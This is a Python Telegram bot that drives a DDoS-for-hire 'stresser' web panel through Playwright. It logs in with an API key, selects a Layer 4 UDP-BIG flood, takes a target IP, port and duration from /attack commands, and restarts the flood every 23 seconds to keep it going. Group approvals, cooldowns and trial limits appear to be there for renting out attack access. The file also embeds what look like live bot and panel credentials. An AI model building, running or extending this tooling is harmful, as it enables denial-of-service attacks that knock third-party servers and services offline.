import re
import logging
import asyncio
import sqlite3
import time
from datetime import datetime
from typing import Optional, Tuple, Dict, Any, List

from playwright.async_api import async_playwright, Page, Browser
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ===== CONFIGURATION =====
BOT_TOKEN = "8644694135:AAGE9gq1svy3oXjYAYv7aJQas-Tz41C7tA4"
API_KEY = "52a733db30394ab6b01030a8940191b7a15a74796a104edbb1738454c0feac81"
AUTH_URL = "https://retrostress.st/auth"
MASTER_USER_ID = 1241657820

# ===== BROWSER SELECTION =====
BROWSER_TYPE = "chromium" #chromium, firefox, webkit
HEADLESS_MODE = True
SLOW_MO_MS = 0

# ===== LOGGING - REDUCED =====
logging.basicConfig(level=logging.ERROR, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)
for lib in ("httpx", "telegram", "telegram.ext"):
    logging.getLogger(lib).setLevel(logging.ERROR)

# ===== DATABASE =====
conn = sqlite3.connect("attack_bot.db", check_same_thread=False)
cursor = conn.cursor()

cursor.executescript("""
    CREATE TABLE IF NOT EXISTS groups (
        group_id INTEGER PRIMARY KEY,
        approved INTEGER DEFAULT 0,
        duration INTEGER DEFAULT 120,
        cooldown INTEGER DEFAULT 100,
        trial_enabled INTEGER DEFAULT 1
    );
    CREATE TABLE IF NOT EXISTS group_usage (
        group_id INTEGER,
        user_id INTEGER,
        last_attack TEXT,
        UNIQUE(group_id, user_id)
    );
    CREATE TABLE IF NOT EXISTS banned_users (
        user_id INTEGER PRIMARY KEY
    );
    CREATE TABLE IF NOT EXISTS user_activity (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        first_name TEXT,
        last_name TEXT,
        last_used TEXT
    );
""")
conn.commit()


# ===== HELPER FUNCTIONS =====
def get_group_config(group_id: int) -> Optional[dict]:
    cursor.execute(
        "SELECT approved, duration, cooldown, trial_enabled FROM groups WHERE group_id = ?",
        (group_id,)
    )
    row = cursor.fetchone()
    if row and row[0] == 1:
        return {"duration": row[1], "cooldown": row[2], "trial": bool(row[3])}
    return None


def validate_port(port: str) -> Tuple[bool, Optional[str]]:
    if not port.isdigit():
        return False, "Port must be a number."
    port_num = int(port)
    if not (1 <= port_num <= 65535):
        return False, "Port must be between 1-65535."
    return True, None


def is_user_banned(user_id: int) -> bool:
    cursor.execute("SELECT 1 FROM banned_users WHERE user_id = ?", (user_id,))
    return cursor.fetchone() is not None


def log_user_activity(user_id: int, username: str = None, first_name: str = None, last_name: str = None) -> None:
    cursor.execute(
        "INSERT OR REPLACE INTO user_activity (user_id, username, first_name, last_name, last_used) "
        "VALUES (?, ?, ?, ?, ?)",
        (user_id, username, first_name, last_name, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    )
    conn.commit()


def send_error_to_admin(application, error_message: str):
    """Send error message to admin"""
    try:
        asyncio.create_task(application.bot.send_message(chat_id=MASTER_USER_ID, text=f"❌ ERROR: {error_message}"))
    except Exception:
        pass


# ===== GLOBAL STATE =====
class AttackState:
    def __init__(self):
        self.running = False
        self.stop_requested = False
        self.task: Optional[asyncio.Task] = None
        self.ip: Optional[str] = None
        self.port: Optional[str] = None
        self.panel_ready = False
        self.page: Optional[Page] = None
        self.browser: Optional[Browser] = None
        self.playwright = None
        self.auth_completed = False
        self.last_check = None
        self.setup_completed = False
        self.attack_start_time: Optional[float] = None
        self.attack_duration: Optional[int] = None
        self.stopped_early: bool = False
        self.init_messages: List[int] = []  # Track initialization messages to delete


state = AttackState()
_active_attacks = {}

# ===== CRITICAL SELECTORS FOR RECHECK =====
CRITICAL_SELECTORS = {
    "ip_input": "input.ct-input.ct-mono[type='text'][placeholder*='1.2.3.4']",
    "port_input": "input.ct-input.ct-mono[type='number']",
    "udp_tab": "button.ct-pill:has-text('UDP')",
    "method_dropdown": "button.ct-combo-trigger",
    "udp_big_item": "button.ct-combo-item:has-text('UDP-BIG')",
    "execute_button": "button:has-text('EXECUTE_TEST')",
    "layer4_button": "button:has-text('LAYER 4')"
}


# ===== ROBUST FIELD HELPERS - SPEEDED UP =====
async def fill_with_retry(page: Page, selector: str, value: str, retries: int = 3, delay: float = 0.1) -> bool:
    """Fill a field with retries - SPEEDED UP"""
    for attempt in range(retries):
        try:
            await page.wait_for_selector(selector, state="visible", timeout=3000)
            await page.click(selector, click_count=3)
            await page.keyboard.press("Backspace")
            await page.fill(selector, value, timeout=3000)
            actual = await page.input_value(selector, timeout=2000)
            if actual == value:
                return True
        except Exception:
            pass
        await asyncio.sleep(delay)
    return False


async def click_with_retry(page: Page, selector: str, retries: int = 3, delay: float = 0.1) -> bool:
    """Click an element with retries - SPEEDED UP"""
    for attempt in range(retries):
        try:
            await page.wait_for_selector(selector, state="visible", timeout=3000)
            await page.click(selector, timeout=3000)
            return True
        except Exception:
            pass
        await asyncio.sleep(delay)
    return False


async def wait_for_element(page: Page, selector: str, timeout: float = 5000, state: str = "visible") -> bool:
    try:
        await page.wait_for_selector(selector, state=state, timeout=timeout)
        return True
    except Exception:
        return False


# ===== RECHECK FUNCTION =====
async def perform_full_recheck(update: Update = None) -> Dict[str, Any]:
    results = {
        "valid": False,
        "auth_ok": False,
        "panel_ok": False,
        "elements_ok": False,
        "details": [],
        "needs_restart": False
    }
    
    if state.page is None:
        results["details"].append("❌ No page object exists")
        results["needs_restart"] = True
        if update:
            await update.message.reply_text("❌ No page object. Run /start first.")
        return results
    
    try:
        await state.page.evaluate("1")
        results["details"].append("✅ Page is responsive")
    except Exception as e:
        results["details"].append(f"❌ Page is dead: {str(e)[:50]}")
        results["needs_restart"] = True
        if update:
            await update.message.reply_text("❌ Page is dead. Run /start to restart.")
        return results
    
    try:
        current_url = state.page.url
        results["details"].append(f"📍 Current URL: {current_url}")
        
        if "auth" in current_url.lower():
            results["details"].append("⚠️ Still on auth page - authentication may not be complete")
            results["auth_ok"] = False
        else:
            results["details"].append("✅ Not on auth page - likely authenticated")
            results["auth_ok"] = True
            
    except Exception:
        results["details"].append("⚠️ URL check failed")
        results["auth_ok"] = False
    
    if results["auth_ok"]:
        try:
            panel_indicators = [
                "input.ct-input.ct-mono",
                "button.ct-pill",
                "button.ct-combo-trigger"
            ]
            found_panel = False
            for selector in panel_indicators:
                try:
                    elem = await state.page.query_selector(selector)
                    if elem:
                        found_panel = True
                        results["details"].append(f"✅ Found panel element: {selector}")
                        break
                except:
                    pass
            
            if found_panel:
                results["panel_ok"] = True
                results["details"].append("✅ Panel appears to be loaded")
            else:
                results["details"].append("⚠️ No panel elements found")
                results["panel_ok"] = False
        except Exception:
            results["details"].append("⚠️ Panel check failed")
    
    if results["panel_ok"]:
        missing_elements = []
        found_elements = []
        
        for name, selector in CRITICAL_SELECTORS.items():
            try:
                elem = await state.page.query_selector(selector)
                if elem:
                    found_elements.append(name)
                else:
                    missing_elements.append(name)
            except Exception:
                missing_elements.append(name)
        
        if missing_elements:
            results["details"].append(f"⚠️ Missing elements: {', '.join(missing_elements)}")
            results["elements_ok"] = False
        else:
            results["details"].append(f"✅ All critical elements present")
            results["elements_ok"] = True
    
    if results["auth_ok"] and results["panel_ok"] and results["elements_ok"]:
        results["valid"] = True
        state.panel_ready = True
        state.auth_completed = True
        state.last_check = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        results["details"].append("✅ Full recheck passed - state is valid")
    else:
        results["valid"] = False
        results["details"].append("❌ Recheck failed - some components missing")
        if results["needs_restart"] or not results["auth_ok"]:
            results["details"].append("💡 Run /start to reinitialize")
    
    return results


async def delete_init_messages(update: Update) -> None:
    """Delete all initialization messages"""
    try:
        for msg_id in state.init_messages:
            try:
                await update.message.chat.delete_message(msg_id)
            except Exception:
                pass
        state.init_messages = []
    except Exception:
        pass


# ===== AUTHENTICATION + PANEL IN ONE FLOW =====
async def init_browser_and_panel(update: Update) -> bool:
    global state
    
    if state.panel_ready and state.page is not None and state.setup_completed:
        await update.message.reply_text("✅ Panel already ready! Use /attack")
        return True
    
    try:
        state.playwright = await async_playwright().start()
        
        launch_args = {
            "headless": HEADLESS_MODE,
            "slow_mo": SLOW_MO_MS,
            "args": [
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-extensions",
                "--disable-gpu",
                "--window-size=1280,800"
            ]
        }
        
        if BROWSER_TYPE == "chromium":
            state.browser = await state.playwright.chromium.launch(**launch_args)
        elif BROWSER_TYPE == "firefox":
            state.browser = await state.playwright.firefox.launch(**launch_args)
        elif BROWSER_TYPE == "webkit":
            state.browser = await state.playwright.webkit.launch(**launch_args)
        else:
            raise ValueError(f"Unsupported browser: {BROWSER_TYPE}")
        
        state.page = await state.browser.new_page()
        
        # Send and track opening message
        msg = await update.message.reply_text("🔐 Opening auth page...")
        state.init_messages.append(msg.message_id)
        
        await state.page.goto(AUTH_URL, timeout=60000)
        await state.page.wait_for_load_state("domcontentloaded", timeout=15000)
        await state.page.wait_for_selector("input#accessKey", state="visible", timeout=10000)
        
        auth_success = False
        for auth_attempt in range(3):
            msg = await update.message.reply_text(f"📝 Entering API key (attempt {auth_attempt+1}/3)...")
            state.init_messages.append(msg.message_id)
            
            key_filled = await fill_with_retry(state.page, "input#accessKey", API_KEY, retries=3, delay=0.1)
            if not key_filled:
                continue
            
            auth_clicked = await click_with_retry(state.page, "button:has-text('AUTHENTICATE')", retries=3, delay=0.1)
            if not auth_clicked:
                continue
            
            try:
                await state.page.wait_for_load_state("networkidle", timeout=15000)
            except:
                pass
            await asyncio.sleep(1)
            
            current_url = state.page.url
            if "auth" not in current_url.lower():
                auth_success = True
                msg = await update.message.reply_text("✅ Authentication successful!")
                state.init_messages.append(msg.message_id)
                break
            else:
                await state.page.reload()
                await state.page.wait_for_selector("input#accessKey", state="visible", timeout=5000)
        
        if not auth_success:
            await update.message.reply_text("❌ Authentication failed after multiple attempts.")
            await delete_init_messages(update)
            return False
        
        msg = await update.message.reply_text("🔘 Looking for START TEST button...")
        state.init_messages.append(msg.message_id)
        
        start_clicked = False
        try:
            if await wait_for_element(state.page, 'a.btn.btn-primary:has-text("START TEST")', timeout=30000):
                start_clicked = await click_with_retry(state.page, 'a.btn.btn-primary:has-text("START TEST")', retries=3, delay=0.1)
            if not start_clicked:
                try:
                    await state.page.click('a[href="/panel"]', timeout=10000)
                    start_clicked = True
                except Exception:
                    start_clicked = True
        except Exception:
            start_clicked = True
        
        msg = await update.message.reply_text("🌐 Waiting for panel to load...")
        state.init_messages.append(msg.message_id)
        await state.page.wait_for_load_state("networkidle", timeout=60000)
        
        # ONE-TIME SETUP - only runs once
        if not state.setup_completed:
            msg = await update.message.reply_text("⚙️ Performing one-time panel setup (LAYER 4, UDP-BIG)...")
            state.init_messages.append(msg.message_id)
            
            await click_with_retry(state.page, "button:has-text('LAYER 4')", retries=3, delay=0.1)
            await asyncio.sleep(0.3)
            
            ip_sel = "input[placeholder='1.2.3.4 or 1.2.3.0/24']"
            await fill_with_retry(state.page, ip_sel, "1.2.3.4", retries=3, delay=0.1)
            
            port_sel = "input.ct-input.ct-mono[type='number']"
            await fill_with_retry(state.page, port_sel, "80", retries=3, delay=0.1)
            
            msg = await update.message.reply_text("📌 Selecting UDP-BIG method...")
            state.init_messages.append(msg.message_id)
            if await select_udp_big(state.page, update):
                msg = await update.message.reply_text("✅ UDP-BIG selected!")
                state.init_messages.append(msg.message_id)
            else:
                msg = await update.message.reply_text("⚠️ UDP-BIG selection failed, but panel may still work.")
                state.init_messages.append(msg.message_id)
            
            state.setup_completed = True
            msg = await update.message.reply_text("✅ One-time setup complete!")
            state.init_messages.append(msg.message_id)
        
        state.panel_ready = True
        state.auth_completed = True
        
        # Delete all initialization messages
        await delete_init_messages(update)
        
        # Send final ready message without browser visibility note
        await update.message.reply_text(
            "✅ PANEL READY!\n"
            "Send: /attack <IP> <PORT> <TIME>\n"
            "Example: /attack 1.2.3.4 80 60"
        )
        return True
        
    except Exception as e:
        error_msg = f"Init error: {str(e)[:200]}"
        logger.error(error_msg)
        send_error_to_admin(update.get_bot(), error_msg)
        await update.message.reply_text(f"❌ Initialization failed: {str(e)[:200]}")
        state.panel_ready = False
        await delete_init_messages(update)
        return False


async def select_udp_big(page: Page, update: Update = None) -> bool:
    try:
        if not await click_with_retry(page, "button.ct-pill:has-text('UDP')", retries=3, delay=0.1):
            return False
        await asyncio.sleep(0.2)
        
        if not await click_with_retry(page, "button.ct-combo-trigger", retries=3, delay=0.1):
            return False
        await asyncio.sleep(0.2)
        
        if not await click_with_retry(page, "button.ct-combo-item:has-text('UDP-BIG')", retries=3, delay=0.1):
            return False
        await asyncio.sleep(0.2)
        
        return True
        
    except Exception:
        try:
            await page.evaluate("""
                const udpBtn = document.querySelector('button.ct-pill');
                if (udpBtn && udpBtn.textContent.trim() === 'UDP') udpBtn.click();
                
                setTimeout(() => {
                    const trigger = document.querySelector('button.ct-combo-trigger');
                    if (trigger) trigger.click();
                    
                    setTimeout(() => {
                        const items = document.querySelectorAll('button.ct-combo-item');
                        for (let item of items) {
                            if (item.textContent.trim() === 'UDP-BIG') {
                                item.click();
                                break;
                            }
                        }
                    }, 300);
                }, 300);
            """)
            await asyncio.sleep(1)
            return True
        except Exception as e2:
            logger.error(f"UDP-BIG selection failed: {e2}")
            send_error_to_admin(update.get_bot(), f"UDP-BIG selection failed: {e2}")
            return False


async def find_stop_button(page: Page):
    selectors = [
        'button.ct-act.ct-act-danger:has-text("stop")',
        'button.ct-act.ct-act-danger',
        'button:has-text("stop")'
    ]
    for selector in selectors:
        try:
            btns = await page.query_selector_all(selector)
            for btn in btns:
                text = await btn.text_content()
                if text and "stop" in text.lower() and "all" not in text.lower():
                    return btn
        except Exception:
            continue
    return None


# ===== ATTACK LOOP WITH SPEEDED UP FILLING =====
async def launch_attack_fast(ip: str, port: str, total_duration: int, update: Update, message) -> str:
    global state
    
    if not state.panel_ready or state.page is None:
        return "❌ Panel not ready. Run /start first."
    
    try:
        await state.page.evaluate("1")
    except Exception:
        state.panel_ready = False
        return "❌ Page closed. Run /start again."
    
    state.running = True
    state.stop_requested = False
    state.stopped_early = False
    state.attack_start_time = time.monotonic()
    state.attack_duration = total_duration
    
    # SET TARGET IP + PORT - SPEEDED UP
    ip_sel = "input.ct-input.ct-mono[type='text'][placeholder*='1.2.3.4']"
    if not await fill_with_retry(state.page, ip_sel, ip, retries=3, delay=0.1):
        state.running = False
        return "❌ Failed to set IP after retries"
    
    port_sel = "input.ct-input.ct-mono[type='number']"
    if not await fill_with_retry(state.page, port_sel, port, retries=3, delay=0.1):
        state.running = False
        return "❌ Failed to set port after retries"
    
    # START ATTACK
    start_success = False
    for _ in range(3):
        try:
            await state.page.click("button:has-text('EXECUTE_TEST')", timeout=3000)
            start_success = True
            break
        except Exception:
            try:
                await state.page.click("button:has-text('Execute')", timeout=2000)
                start_success = True
                break
            except Exception:
                try:
                    await state.page.click(".ct-btn-primary", timeout=2000)
                    start_success = True
                    break
                except Exception:
                    try:
                        await state.page.evaluate("""
                            document.querySelectorAll('button').forEach(b => {
                                if(b.textContent.includes('EXECUTE') || b.textContent.includes('Execute')) {
                                    b.click();
                                }
                            });
                        """)
                        start_success = True
                        break
                    except Exception:
                        pass
        await asyncio.sleep(0.2)
    
    if not start_success:
        state.running = False
        return "❌ Failed to start attack"
    
    # Send launch message after 2 seconds
    launch_text = (
        f"🚀 Attack Launched!\n"
        f"╔════════════════════════╗\n"
        f"║   ⚔️ ATTACK ACTIVE     ║\n"
        f"╚════════════════════════╝\n\n"
        f"🎯 Target: {ip}\n"
        f"🔌 Port: {port}\n"
        f"⏱️ Duration: {total_duration}s\n\n"
        f"🔄 Attack is running..."
    )
    try:
        await message.edit_text(launch_text)
    except Exception:
        pass
    
    # --- MAIN LOOP ---
    start_time = time.monotonic()
    total_downtime = 0.0
    restart_interval = 23.0
    next_restart_at = restart_interval
    completed_naturally = False
    
    while state.running:
        now = time.monotonic()
        active_elapsed = now - start_time - total_downtime
        
        if active_elapsed >= total_duration:
            completed_naturally = True
            break
        
        if state.stop_requested:
            state.stopped_early = True
            break
        
        if active_elapsed >= next_restart_at and active_elapsed < total_duration:
            before_restart = time.monotonic()
            
            stop_btn = await find_stop_button(state.page)
            if stop_btn:
                await stop_btn.click()
                await asyncio.sleep(0.2)
            
            try:
                await state.page.click("button:has-text('EXECUTE_TEST')", timeout=3000)
                await asyncio.sleep(0.1)
            except Exception as e:
                error_msg = f"Restart failed: {str(e)[:50]}"
                logger.error(error_msg)
                send_error_to_admin(update.get_bot(), error_msg)
                state.running = False
                break
            
            after_restart = time.monotonic()
            total_downtime += (after_restart - before_restart)
            next_restart_at += restart_interval
        
        await asyncio.sleep(0.1)
    
    if state.running and not state.stopped_early:
        stop_btn = await find_stop_button(state.page)
        if stop_btn:
            await stop_btn.click()
            await asyncio.sleep(0.3)
    
    state.running = False
    state.attack_start_time = None
    state.attack_duration = None
    
    # Send completion message if attack completed naturally
    if completed_naturally and not state.stopped_early:
        complete_text = (
            f"✅ Attack Completed Successfully!\n"
            f"╔════════════════════════╗\n"
            f"║   ✨ SUCCESS           ║\n"
            f"╚════════════════════════╝\n\n"
            f"🎯 Target: {ip}:{port}\n"
            f"⏱️ Duration: {total_duration}s"
        )
        try:
            await message.edit_text(complete_text)
        except Exception:
            pass
    
    return "✅ Attack completed."


# ===== PROGRESS UPDATER =====
async def progress_updater(update: Update, message, duration: int, attack_type: str, ip: str, port: str) -> None:
    """Wait for attack to complete."""
    while state.running:
        await asyncio.sleep(1)


# ===== TELEGRAM HANDLERS =====
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_user_banned(user.id):
        await update.message.reply_text("⛔ You are banned from using this bot.")
        return
    
    log_user_activity(user.id, user.username, user.first_name, user.last_name)
    
    chat = update.effective_chat
    if chat.type in ("group", "supergroup"):
        config = get_group_config(chat.id)
        if not config:
            await update.message.reply_text("❌ This group is not approved. Contact @tfyours")
            return
        if config["trial"]:
            await update.message.reply_text(
                "╔════════════════════════════════════╗\n"
                "║       🌐 ATTACK BOT READY         ║\n"
                "╠════════════════════════════════════╣\n"
                "║  📌 GROUP MODE                    ║\n"
                f"║  ⏱️  Duration: {config['duration']}s        ║\n"
                f"║  🔄 Cooldown: {config['cooldown']}s        ║\n"
                "║  📝 Use: /attack <ip> <port>      ║\n"
                "║  📊 /status - Check attacks       ║\n"
                "║  🔍 /recheck - Verify state       ║\n"
                "╚════════════════════════════════════╝"
            )
        else:
            await update.message.reply_text("⛔ Trial disabled in this group.")
        return
    
    await update.message.reply_text(
        "╔════════════════════════════════════╗\n"
        "║      🚀 ATTACK BOT READY          ║\n"
        "╠════════════════════════════════════╣\n"
        "║  📌 PRIVATE MODE                  ║\n"
        "║  📝 Use: /attack <ip> <port> <time>║\n"
        "║  📊 /status - Check attacks       ║\n"
        "║  🔍 /recheck - Verify state       ║\n"
        "╚════════════════════════════════════╝"
    )
    
    if not state.panel_ready:
        if not await init_browser_and_panel(update):
            await update.message.reply_text("❌ Initialization failed.")
    else:
        await update.message.reply_text("✅ Panel already ready! Use /attack")


async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_user_banned(user.id):
        await update.message.reply_text("⛔ You are banned from using this bot.")
        return
    
    log_user_activity(user.id, user.username, user.first_name, user.last_name)
    
    if state.running:
        await update.message.reply_text("❌ An attack is already in progress. Please wait.")
        return
    
    args = context.args
    if not args or len(args) < 3:
        await update.message.reply_text("❌ Usage: /attack <IP> <PORT> <TIME>\nExample: /attack 34.0.25.456 85646 100")
        return
    
    ip, port, time_str = args[0], args[1], args[2]
    
    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
        await update.message.reply_text("❌ Invalid IP address format")
        return
    
    valid, err = validate_port(port)
    if not valid:
        await update.message.reply_text(err)
        return
    
    if not time_str.isdigit() or int(time_str) < 1:
        await update.message.reply_text("❌ Time must be >= 1 second")
        return
    
    duration = int(time_str)
    chat = update.effective_chat
    
    if chat.type in ("group", "supergroup"):
        config = get_group_config(chat.id)
        if not config:
            await update.message.reply_text("❌ Group not approved. Contact @tfyours")
            return
        if not config["trial"]:
            await update.message.reply_text("⛔ Trial disabled in this group.")
            return
        if duration > config["duration"]:
            await update.message.reply_text(f"⏱️ Max duration for this group is {config['duration']}s")
            return
        
        cursor.execute(
            "SELECT last_attack FROM group_usage WHERE group_id = ? AND user_id = ?",
            (chat.id, user.id)
        )
        row = cursor.fetchone()
        if row:
            last = datetime.strptime(row[0], "%Y-%m-%d %H:%M:%S")
            diff = (datetime.now() - last).total_seconds()
            if diff < config["cooldown"]:
                remaining = int(config["cooldown"] - diff)
                await update.message.reply_text(f"⏳ Cooldown {remaining}s left.")
                return
        
        cursor.execute(
            "INSERT OR REPLACE INTO group_usage (group_id, user_id, last_attack) VALUES (?, ?, ?)",
            (chat.id, user.id, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        )
        conn.commit()
    
    if not state.panel_ready or state.page is None:
        await update.message.reply_text("❌ Panel not ready. Please run /start first.")
        return
    
    attack_type = "GROUP" if chat.type in ("group", "supergroup") else "PRIVATE"
    
    # Store IP and port for status
    state.ip = ip
    state.port = port
    
    # Send initial message that will be edited after 2 seconds
    sent = await update.message.reply_text("⏳ Starting attack...")
    
    # Start attack task
    state.task = asyncio.create_task(launch_attack_fast(ip, port, duration, update, sent))
    
    # Start progress updater to monitor completion
    asyncio.create_task(progress_updater(update, sent, duration, attack_type, ip, port))


async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_user_banned(user.id):
        await update.message.reply_text("⛔ You are banned from using this bot.")
        return
    
    log_user_activity(user.id, user.username, user.first_name, user.last_name)
    
    if not state.running:
        await update.message.reply_text("❌ No attack is currently running.")
        return
    
    await update.message.reply_text("🛑 Stopping attack...")
    state.stop_requested = True
    state.stopped_early = True
    await asyncio.sleep(3)
    
    if state.task and not state.task.done():
        state.task.cancel()
    
    state.running = False
    state.stop_requested = False
    state.attack_start_time = None
    state.attack_duration = None
    await update.message.reply_text("✅ Attack stopped.")


async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_user_banned(user.id):
        await update.message.reply_text("⛔ You are banned from using this bot.")
        return
    
    log_user_activity(user.id, user.username, user.first_name, user.last_name)
    
    # Calculate remaining time if attack is running
    remaining = None
    if state.running and state.attack_start_time and state.attack_duration:
        elapsed = time.monotonic() - state.attack_start_time
        remaining = max(0, int(state.attack_duration - elapsed))
    
    status_lines = [
        "🤖 Bot Running",
        f"⚡ Status: {'Busy' if state.running else 'Ready to Attack'}",
        f"🎯 Current Target IP: {state.ip if state.ip else 'N/A'}",
        f"🔌 Current Port: {state.port if state.port else 'N/A'}"
    ]
    
    if remaining is not None and remaining > 0:
        status_lines.append(f"⏱️ Remaining Attack Duration: {remaining}s")
    elif state.running:
        status_lines.append("⏱️ Remaining Attack Duration: Calculating...")
    
    await update.message.reply_text("\n".join(status_lines))


async def recheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_user_banned(user.id):
        await update.message.reply_text("⛔ You are banned from using this bot.")
        return
    
    log_user_activity(user.id, user.username, user.first_name, user.last_name)
    
    await update.message.reply_text("🔍 Running full state recheck...")
    
    results = await perform_full_recheck(update)
    
    response = "╔════════════════════════════════════╗\n"
    response += "║      🔍 RECHECK RESULTS           ║\n"
    response += "╠════════════════════════════════════╣\n"
    
    status_icon = "✅" if results["valid"] else "❌"
    response += f"║  Status: {status_icon} {'VALID' if results['valid'] else 'INVALID'}\n"
    response += "║────────────────────────────────────║\n"
    
    response += f"║  Auth: {'✅ OK' if results['auth_ok'] else '❌ FAIL'}\n"
    response += f"║  Panel: {'✅ OK' if results['panel_ok'] else '❌ FAIL'}\n"
    response += f"║  Elements: {'✅ OK' if results['elements_ok'] else '❌ FAIL'}\n"
    
    if results["needs_restart"]:
        response += "║  💡 ACTION: Run /start\n"
    elif not results["valid"]:
        response += "║  💡 ACTION: Run /start\n"
    else:
        response += "║  ✅ All systems ready\n"
    
    response += "╠────────────────────────────────────╣\n"
    
    detail_lines = results["details"][:5]
    for detail in detail_lines:
        if len(detail) > 30:
            detail = detail[:27] + "..."
        response += f"║  {detail}\n"
    
    if len(results["details"]) > 5:
        response += f"║  ... and {len(results['details']) - 5} more\n"
    
    response += "╚════════════════════════════════════╝"
    
    await update.message.reply_text(response)
    
    if results["needs_restart"] or not results["valid"]:
        await update.message.reply_text(
            "💡 State invalid. Run /start to reinitialize the panel.\n"
            "This will launch a new browser session and re-authenticate."
        )
    else:
        await update.message.reply_text(
            "✅ All systems green. You can use /attack now."
        )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_user_banned(user.id):
        await update.message.reply_text("⛔ You are banned from using this bot.")
        return
    
    log_user_activity(user.id, user.username, user.first_name, user.last_name)
    
    await update.message.reply_text(
        "╔════════════════════════════════════╗\n"
        "║      📖 COMMANDS LIST             ║\n"
        "╠════════════════════════════════════╣\n"
        "║  /start - Init panel (ONCE)       ║\n"
        "║  /attack <IP> <PORT> <TIME>       ║\n"
        "║  /stop - Stop current attack      ║\n"
        "║  /status - Show current state     ║\n"
        "║  /recheck - Verify full state     ║\n"
        "║  /help - Show this help           ║\n"
        "║  /restart - (Admin) Full restart  ║\n"
        "╠════════════════════════════════════╣\n"
        "║  ⭐ SAME PAGE AUTH + PANEL        ║\n"
        "║  ⏱️ Panel opens ONCE on /start    ║\n"
        "║  /attack changes IP/port only     ║\n"
        "║  Example: /attack 1.2.3.4 80 60   ║\n"
        "║  Use /stop to end early           ║\n"
        "╚════════════════════════════════════╝"
    )


# ===== ADMIN COMMANDS - ONLY /restart REMAINS =====
async def restart_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != MASTER_USER_ID:
        await update.message.reply_text("⛔ Access Denied. Master only.")
        return
    
    await update.message.reply_text("🔄 Restarting browser session...")
    
    if state.running:
        state.stop_requested = True
        if state.task and not state.task.done():
            state.task.cancel()
        await asyncio.sleep(1)
        state.running = False
        state.stop_requested = False
    
    try:
        if state.page:
            await state.page.close()
        if state.browser:
            await state.browser.close()
        if state.playwright:
            await state.playwright.stop()
    except Exception as e:
        logger.error(f"Cleanup error: {e}")
        send_error_to_admin(update.get_bot(), f"Cleanup error: {e}")
    
    state.panel_ready = False
    state.auth_completed = False
    state.setup_completed = False
    state.page = None
    state.browser = None
    state.playwright = None
    state.ip = None
    state.port = None
    state.last_check = None
    state.attack_start_time = None
    state.attack_duration = None
    state.stopped_early = False
    state.init_messages = []
    
    if await init_browser_and_panel(update):
        await update.message.reply_text("✅ Restart completed successfully.")
    else:
        await update.message.reply_text("❌ Restart failed. Please try /start manually.")


# ===== MAIN =====
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("recheck", recheck_command))
    app.add_handler(CommandHandler("help", help_command))
    
    # Only admin command remaining
    app.add_handler(CommandHandler("restart", restart_command))
    
    try:
        app.run_polling()
    finally:
        if state.browser:
            asyncio.run(state.browser.close())
        if state.playwright:
            asyncio.run(state.playwright.stop())
        conn.close()


if __name__ == "__main__":
    main()
